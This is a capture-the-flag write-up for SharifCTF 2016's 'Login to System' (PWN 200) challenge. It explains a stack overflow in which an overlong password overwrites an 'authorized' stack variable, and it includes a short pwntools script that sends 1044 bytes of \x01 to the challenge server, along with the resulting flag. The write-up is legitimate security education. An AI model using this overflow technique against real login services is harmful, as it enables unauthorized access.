+++
authors = "kbeckmann"
categories = [ "writeups" ]
date = "2016-02-06T22:31:14+01:00"
title = "SharifCTF 2016 Login to System (PWN 200) Writeup"
+++

# Problem

> Can you login to this system without username and password?
>
> telnet ctf.sharif.edu 27515
>
> Run and capture the flag!
>
> Download

Points: 200

Solved by 106 team(s)

# Solution

We are provided with a x86-64 linux executable:
~~~
Question: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=76aad63504451c70d8aa4e72299d2821fcf1b9f1, stripped
~~~

It is a server that starts a new handler thread for each incoming TCP connection on port 27515.

- The handler function prints a welcome message and reads your username and password.
- Then it checks if a stack variable, let's call it `authorized`, is `1`.
- If true, read the flag from file system and prints it.

There are several strange things going on here.

- Username and password are both able to overwrite the stack.
- The stack value `authorized` is read but never written to.

I was over thinking here and thought awesome - let's smash the stack jump into the true case in the if clause and get the flag. So I spent some time trying to get a nice ROP to do what I wanted. Big waste of time.

It turns out that the stack value `authorized` is located after both username and password, so the solution was to just fill the stack with \x01 and get the flag.

~~~
#!/usr/bin/env python2

from pwn import *
context(os = 'linux', arch = 'amd64')

r = remote('ctf.sharif.edu', 27515)

print r.recv()

r.sendline("Hello") # username
print r.recv()

r.sendline("\x01"*(1044)) # password
print r.recv()
~~~

Running it gets us the flag immediately.

~~~
Please enter your username and then press enter: Hello
Please enter your password and then press enter: \x01...
You are already logged in! Your flag is: cgjxkkbmdhudbovtezyv
~~~


*Flag is cgjxkkbmdhudbovtezyv*
